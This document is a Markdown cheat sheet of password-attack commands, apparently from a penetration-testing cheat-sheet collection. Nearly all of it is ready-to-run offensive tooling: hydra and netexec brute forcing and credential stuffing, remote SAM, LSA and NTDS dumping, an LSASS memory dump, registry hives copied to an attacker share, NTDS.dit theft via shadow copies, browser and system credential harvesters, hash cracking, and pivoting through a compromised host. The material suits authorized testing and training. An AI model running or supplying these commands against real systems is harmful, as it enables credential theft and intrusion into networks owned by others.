# Password Attacks

## Connecting to Targets

| Command | Description |
|---|---|
| `xfreerdp /v:<TARGET> /u:<USER> /p:<PASS>` | RDP connection |
| `evil-winrm -i <TARGET> -u <USER> -p <PASS>` | WinRM PowerShell session |
| `ssh <USER>@<TARGET>` | SSH connection |
| `smbclient -U <USER> \\\\<TARGET>\\<SHARE>` | SMB share connection |
| `python3 smbserver.py -smb2support CompData /local/path/` | Stand up a local SMB share for file transfer |

## Password Mutations & Custom Wordlists

```bash
cewl https://target-site.com -d 4 -m 6 --lowercase -w custom.wordlist
hashcat --force base.list -r custom.rule --stdout > mutated.list
./username-anarchy -i names.txt
```

Find likely-password-bearing file extensions:
```bash
curl -s https://fileinfo.com/filetypes/compressed | html2text | awk '{print tolower($1)}' | grep "\." | tee -a compressed_ext.txt
```

## Remote Password Attacks

| Command | Description |
|---|---|
| `netexec winrm <TARGET> -u users.list -p passwords.list` | Brute force over WinRM |
| `hydra -L users.list -P passwords.list <service>://<TARGET>` | Generic Hydra brute force |
| `hydra -C creds.list ssh://<TARGET>` | Credential stuffing (combo list) |
| `netexec smb <TARGET> --local-auth -u <USER> -p <PASS> --sam` | Dump SAM remotely |
| `netexec smb <TARGET> --local-auth -u <USER> -p <PASS> --lsa` | Dump LSA secrets (often cleartext) |
| `netexec smb <TARGET> -u <USER> -p <PASS> --ntds` | Dump NTDS hashes |
| `evil-winrm -i <TARGET> -u Administrator -H "<NTHASH>"` | Pass-the-Hash via WinRM |
| `./Pcredz -f capture.pcapng -t -v` | Extract credentials from a packet capture |

## Windows Local Password Attacks

```
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
Get-Process lsass
rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
```
```bash
pypykatz lsa minidump /path/to/lsassdumpfile
```

**Registry hive extraction (offline SAM cracking):**
```
reg.exe save hklm\sam C:\sam.save
move sam.save \\<ATTACKER_SHARE>\dest
```
```bash
python3 secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```

**NTDS.dit via volume shadow copy:**
```
vssadmin CREATE SHADOW /For=C:
cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
```

**Stored credential enumeration:**
```
rundll32 keymgr.dll,KRShowKeyMgr
cmdkey /list
runas /savecred /user:<USER> cmd
snaffler.exe -s
Invoke-HuntSMBShares -Threads 100 -OutputDirectory c:\Users\Public
```

## Linux Local Password Attacks

**Config/credential file sweeps:**
```bash
for l in $(echo ".conf .config .cnf"); do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib|fonts|share|core"; done
for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc|lib"); do echo -e "\nFile: " $i; grep "user|password|pass" $i 2>/dev/null | grep -v "\#"; done
grep -rnw "PRIVATE KEY" /home/* 2>/dev/null | grep ":1"
grep -rnw "ssh-rsa" /home/* 2>/dev/null | grep ":1"
tail -n5 /home/*/.bash*
```

**Credential harvesting tools:**
```bash
python3 mimipenguin.py
bash mimipenguin.sh
python2.7 lazagne.py all
python3 lazagne.py browsers
```

**Firefox stored credentials:**
```bash
ls -l .mozilla/firefox/ | grep default
cat .mozilla/firefox/*.default-release/logins.json | jq .
python3.9 firefox_decrypt.py
```

## Cracking Passwords

| Command | Description |
|---|---|
| `hashcat -m 1000 hashes.txt rockyou.txt` | NTLM |
| `hashcat -m 1000 <hash> rockyou.txt --show` | Single hash, show inline |
| `unshadow passwd.bak shadow.bak > unshadowed.hashes` | Combine for cracking |
| `hashcat -m 1800 -a 0 unshadowed.hashes rockyou.txt -o cracked.out` | crypt/SHA512 (Linux shadow) |
| `hashcat -m 500 -a 0 md5-hashes.list rockyou.txt` | MD5 |
| `hashcat -m 22100 backup.hash rockyou.txt -o backup.cracked` | BitLocker |
| `python3 ssh2john.py id_rsa > ssh.hash` → `john ssh.hash --show` | SSH key passphrase |
| `office2john.py Protected.docx > out.hash` → `john --wordlist=rockyou.txt out.hash` | Office document |
| `pdf2john.pl file.pdf > pdf.hash` → `john --wordlist=rockyou.txt pdf.hash` | PDF |
| `zip2john file.zip > zip.hash` → `john --wordlist=rockyou.txt zip.hash` | ZIP |
| `bitlocker2john -i Backup.vhd > backup.hashes` | BitLocker VHD |

**Password-protected archive brute force:**
```bash
for i in $(cat rockyou.txt); do openssl enc -aes-256-cbc -d -in file.gzip -k $i 2>/dev/null | tar xz; done
```

## Pivoting Through a Compromised Host

```bash
ssh -D 9050 user@<DMZ_HOST>
# /etc/proxychains.conf must have: socks4 127.0.0.1 9050
sudo proxychains -q nmap -sT -Pn <INTERNAL_TARGET> --open
proxychains xfreerdp /v:<INTERNAL_TARGET> /u:<USER> /p:<PASS>
```

---

<div align="center">

*Part of the [D4RKGUNN3R Cheatsheets](./README.md) collection.*

</div>
